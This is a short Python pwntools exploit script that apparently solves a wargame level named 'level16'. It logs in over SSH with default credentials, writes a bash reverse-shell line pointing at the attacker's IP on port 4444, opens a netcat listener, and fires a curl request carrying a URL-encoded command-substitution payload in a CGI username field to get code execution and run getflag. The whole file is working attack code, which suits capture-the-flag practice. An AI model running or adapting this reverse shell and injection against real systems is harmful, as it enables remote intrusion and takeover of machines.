#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 3:
	sys.exit(f"{argv[0]} Target_IP Local_IP") 

level16 = ssh(host=argv[1],user='level16',password='level16')
level16_shell = level16.shell('sh')
level16_shell.sendline(f"echo -e '#!/bin/bash\\nbash -i >& /dev/tcp/{argv[2]}/4444 0>&1'")
netcat = process(['nc','-l','4444'])
curl = process(['curl','http://192.168.56.105:1616/index.cgi?username=%24%28%2F%2A%2Fexploit%29&password=hello'])
netcat.sendline('getflag')
netcat.interactive(prompt="")